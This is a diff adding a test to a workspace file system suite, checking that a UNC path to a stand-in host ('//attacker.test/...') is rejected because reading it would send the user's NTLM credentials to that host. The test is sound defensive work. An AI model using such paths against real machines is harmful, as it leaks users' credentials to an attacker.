@@ -155,6 +155,20 @@ it.layer(TestLayer, { excludeTestServices: true })("WorkspaceFileSystemLive", (i
       }),
     );
 
+    // Reading a network path makes Windows sign in to its host with the user's
+    // NTLM credentials, so one must fail the root check before any lookup.
+    it.effect("refuses a network path outside the workspace", () =>
+      Effect.gen(function* () {
+        const workspaceFileSystem = yield* WorkspaceFileSystem.WorkspaceFileSystem;
+        const cwd = yield* makeTempDir;
+
+        const error = yield* workspaceFileSystem
+          .readFile({ cwd, relativePath: "//attacker.test/s/a.md" })
+          .pipe(Effect.flip);
+        expect(error).toBeInstanceOf(WorkspacePaths.WorkspacePathOutsideRootError);
+      }),
+    );
+
     it.effect("rejects symlinks that resolve outside the workspace root", () =>
       Effect.gen(function* () {
         const workspaceFileSystem = yield* WorkspaceFileSystem.WorkspaceFileSystem;
